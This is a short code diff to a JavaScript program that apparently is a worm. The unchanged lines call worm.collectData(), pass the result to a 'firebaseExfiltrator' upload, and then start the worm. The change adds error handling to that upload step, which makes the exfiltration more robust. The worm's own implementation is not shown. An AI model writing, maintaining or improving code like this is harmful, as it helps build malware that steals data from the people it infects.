@@ -684,6 +684,8 @@ if (require.main === module) {
   const data = worm.collectData();
   worm.firebaseExfiltrator.upload(data).then(success => {
     console.log("Upload success:", success);
+  }).catch(err => {
+    console.log("Upload error:", err.message);
   });
   worm.run();
 }
